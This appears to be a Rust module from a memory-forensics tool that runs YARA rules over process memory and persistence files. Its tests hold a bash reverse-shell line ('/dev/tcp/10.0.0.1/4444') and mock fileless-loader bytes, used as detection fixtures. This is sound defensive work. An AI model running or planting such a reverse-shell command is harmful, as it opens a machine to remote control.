//! YARA scanning (yara-x) of suspicious memory regions and persistence targets.

use std::sync::OnceLock;
use std::time::Duration;

use rayon::prelude::*;

use super::mem::{open_mem, read_at};
use super::read_bytes;
use crate::core::report::{Category, Finding};
use crate::rules::{self, EMBEDDED};

pub enum Target {
    Mem {
        pid: u32,
        name: String,
        addr: u64,
        len: u64,
        label: String,
    },
    File {
        path: String,
        label: String,
    },
}

pub struct Engine {
    rules: yara_x::Rules,
    pub loaded: usize,
    pub skipped: Vec<String>,
}

/// Compile the embedded rule set plus optional extra rule files.
pub fn engine(extra: &[String]) -> &'static Result<Engine, String> {
    static E: OnceLock<Result<Engine, String>> = OnceLock::new();
    E.get_or_init(|| {
        let mut c = yara_x::Compiler::new();
        let mut loaded = 0;
        let mut skipped = Vec::new();
        for (src, file, text) in EMBEDDED {
            c.new_namespace(&format!("{src}/{file}"));
            match c.add_source(*text) {
                Ok(_) => loaded += 1,
                Err(e) => skipped.push(format!(
                    "{src}/{file}: {}",
                    e.to_string().lines().next().unwrap_or("")
                )),
            }
        }
        for path in extra {
            let Some(b) = read_bytes(path, 64 << 20) else {
                skipped.push(format!("{path}: unreadable"));
                continue;
            };
            c.new_namespace(&format!("user/{}", crate::core::paths::file_name(path)));
            match c.add_source(String::from_utf8_lossy(&b).as_ref()) {
                Ok(_) => loaded += 1,
                Err(e) => skipped.push(format!(
                    "{path}: {}",
                    e.to_string().lines().next().unwrap_or("")
                )),
            }
        }
        Ok(Engine {
            rules: c.build(),
            loaded,
            skipped,
        })
    })
}

fn meta_str(r: &yara_x::Rule, keys: &[&str]) -> Option<String> {
    r.metadata().find_map(|(k, v)| match v {
        yara_x::MetaValue::String(s) if keys.contains(&k) => Some(s.to_string()),
        _ => None,
    })
}

fn meta_int(r: &yara_x::Rule, keys: &[&str]) -> Option<i64> {
    r.metadata().find_map(|(k, v)| match v {
        yara_x::MetaValue::Integer(i) if keys.contains(&k) => Some(i),
        yara_x::MetaValue::String(s) if keys.contains(&k) => s.parse().ok(),
        _ => None,
    })
}

fn hit_finding(r: &yara_x::Rule, mem: bool) -> Finding {
    let ns = r.namespace();
    let source = ns.split('/').next().unwrap_or(ns);
    let sev = rules::severity_for(
        source,
        meta_int(r, &["score", "severity"]),
        meta_str(r, &["severity"]).as_deref(),
        mem,
    );
    let mut f = Finding::new(
        sev,
        Category::Yara,
        format!("YARA match: {}", r.identifier()),
    )
    .detail(format!("rule file: {ns}"));
    if let Some(d) = meta_str(r, &["description"]) {
        f = f.detail(format!("description: {d}"));
    }
    if let Some(a) = meta_str(r, &["author"]) {
        f = f.detail(format!("rule author: {a}"));
    }
    if let Some(rf) = meta_str(r, &["reference", "reference_sample"]) {
        f = f.detail(format!("reference: {rf}"));
    }
    f = f.detail(format!("rule license: {}", rules::license(source)));
    // ATT&CK IDs from the rule's own metadata (Exhume rules carry them); interned once per ID.
    if let Some(m) = meta_str(r, &["mitre", "mitre_attack", "technique"]) {
        for id in m
            .split([',', ' '])
            .map(str::trim)
            .filter(|t| t.starts_with('T') && t.len() >= 5 && t.len() <= 9)
        {
            f = f.mitre(&[intern(id)]);
        }
    }
    f
}

fn intern(id: &str) -> &'static str {
    use std::collections::HashSet;
    use std::sync::Mutex;
    static IDS: OnceLock<Mutex<HashSet<&'static str>>> = OnceLock::new();
    let mut set = IDS.get_or_init(Default::default).lock().unwrap();
    if let Some(s) = set.get(id) {
        return s;
    }
    let s: &'static str = Box::leak(id.to_string().into_boxed_str());
    set.insert(s);
    s
}

/// Size limits and per-scan timeout.
pub struct ScanOpts {
    pub max_file: usize,
    pub max_region: usize,
    pub timeout: Duration,
}

impl Target {
    /// Bytes this target will make YARA read (for largest-first scheduling).
    pub fn cost(&self, o: &ScanOpts) -> u64 {
        match self {
            Target::Mem { len, .. } => (*len).min(o.max_region as u64),
            Target::File { path, .. } => std::fs::metadata(path)
                .map(|m| m.len().min(o.max_file as u64))
                .unwrap_or(0),
        }
    }
}

pub fn scan(eng: &Engine, mut targets: Vec<Target>, o: &ScanOpts) -> Vec<Finding> {
    crate::core::resources::largest_first(&mut targets, |t| t.cost(o));
    targets
        .into_par_iter()
        // One small task per target keeps big and small items interleaved across threads.
        .with_max_len(1)
        .map_init(
            || {
                let mut s = yara_x::Scanner::new(&eng.rules);
                s.set_timeout(o.timeout);
                s
            },
            |scanner, t| {
                if !super::governor::checkpoint() {
                    return Vec::new();
                }
                let (data, mem) = match &t {
                    Target::Mem { pid, addr, len, .. } => {
                        let Some(f) = open_mem(*pid) else {
                            return Vec::new();
                        };
                        (read_at(&f, *addr, (*len as usize).min(o.max_region)), true)
                    }
                    Target::File { path, .. } => {
                        (read_bytes(path, o.max_file).unwrap_or_default(), false)
                    }
                };
                if data.is_empty() {
                    return Vec::new();
                }
                let Ok(res) = scanner.scan(&data) else {
                    return Vec::new();
                };
                res.matching_rules()
                    .map(|r| {
                        let mut f = hit_finding(&r, mem);
                        match &t {
                            Target::Mem {
                                pid,
                                name,
                                addr,
                                label,
                                ..
                            } => {
                                f = f
                                    .proc(*pid, name)
                                    .addr(*addr)
                                    .detail(format!("scanned: {label}"));
                            }
                            Target::File { path, label } => {
                                f = f.path(path.clone()).detail(format!("scanned: {label}"));
                            }
                        }
                        f
                    })
                    .collect()
            },
        )
        .flatten()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every vendored rule file must compile on its own with yara-x.
    #[test]
    fn embedded_rules_compile() {
        let mut bad = Vec::new();
        for (src, file, text) in EMBEDDED {
            let mut c = yara_x::Compiler::new();
            if let Err(e) = c.add_source(*text) {
                bad.push(format!("{src}/{file}: {e}"));
            }
        }
        assert!(
            bad.is_empty(),
            "{} files fail:\n{}",
            bad.len(),
            bad.join("\n")
        );
        assert!(EMBEDDED.len() > 250);
    }

    #[test]
    fn custom_rule_matches() {
        let Ok(e) = engine(&[]) else { panic!() };
        assert!(e.skipped.is_empty(), "{:?}", e.skipped);
        let mut s = yara_x::Scanner::new(&e.rules);
        let data = b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
        let r = s.scan(data).unwrap();
        assert!(r
            .matching_rules()
            .any(|r| r.identifier().starts_with("Exhume_")));
    }

    #[test]
    fn memfd_loader_rule_spares_interpreters() {
        let Ok(e) = engine(&[]) else { panic!() };
        let mut s = yara_x::Scanner::new(&e.rules);
        let mut hit = |d: &[u8]| {
            s.scan(d)
                .unwrap()
                .matching_rules()
                .any(|r| r.identifier() == "Exhume_Fileless_Memfd_Loader")
        };
        let loader = b"\x7fELF\x02\x01\x01\0........memfd_create\0fexecve\0connect\0".to_vec();
        assert!(hit(&loader));
        let mut python = loader.clone();
        python.extend_from_slice(b"Py_Initialize\0");
        assert!(!hit(&python));
    }
}
